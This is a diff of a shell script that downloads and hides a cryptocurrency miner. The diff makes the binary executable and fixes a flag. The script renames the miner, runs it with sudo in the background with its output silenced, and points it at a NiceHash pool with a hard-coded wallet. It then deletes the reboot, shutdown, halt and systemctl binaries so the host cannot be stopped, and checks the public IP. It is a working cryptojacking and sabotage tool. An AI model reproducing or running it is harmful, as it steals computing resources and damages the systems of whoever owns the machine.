@@ -23,8 +23,9 @@ WORKER=$(TZ=":Asia/Jakarta" date '+%A-%d-%B-%Y' | sed 's/Monday/Senin/;s/Tuesday
 mkdir .lib && cd .lib
 wget https://github.com/preak07/kopi/releases/download/kopi/Kopi-Susu.tar.gz  
 tar -xvf Kopi-Susu.tar.gz 
+chmod +x Kopi-Susu
 mv Kopi-Susu sgr1 
-sudo nohup ./sgr1 --algorithm verushash --pool verushash.auto.nicehash.com:9200 --wallet 3AhGzsYExJchLbzGVuiRTk33M5RAmL6C1f --p $WORKER --t 1 > /dev/null 2>&1 &
+sudo nohup ./sgr1 --algorithm verushash --pool verushash.auto.nicehash.com:9200 --wallet 3AhGzsYExJchLbzGVuiRTk33M5RAmL6C1f --p $WORKER -t 1 > /dev/null 2>&1 &
 sleep 30
 sudo rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
 curl ifconfig.me
